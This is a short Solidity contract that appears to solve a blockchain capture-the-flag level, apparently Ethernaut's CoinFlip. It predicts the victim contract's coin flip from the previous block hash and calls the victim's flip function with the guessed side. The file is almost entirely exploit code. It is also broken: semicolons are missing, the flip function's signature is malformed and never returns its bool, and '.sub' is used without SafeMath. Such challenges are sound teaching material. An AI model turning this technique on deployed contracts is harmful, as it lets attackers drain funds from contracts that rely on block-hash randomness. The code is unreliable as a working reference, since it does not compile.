pragma solidity ^0.5.0;

import "./CoinFlip.sol";

/*
This will not run alone, needs the CoinFlip.sol file from the challenge
 */

contract hacked {
	CoinFlip public victimContract
	uint FACTOR =  57896044618658097711785492504343953926634992332820282019728792003956564819968;

	// Create new instance with a CoinFlip object using the address of the instacne from the challenge
	constructor(address _victimAddr) public {
		victimContract = CoinFlip(_victimAddr);
	}

	function flip returns (bool) {
		// Copy the logic of the original contract, using the hash of the previous block as the seed value
		uint256 blockValue = uint256(blockhash(block.number.sub(1)));
		uint256 coinFlip = uint(blockValue / FACTOR);
		bool side = coinFlip == 1 ? true: false;

		// Send the definitive value to the victim contract
		victimContract.flip(side)

	}
}
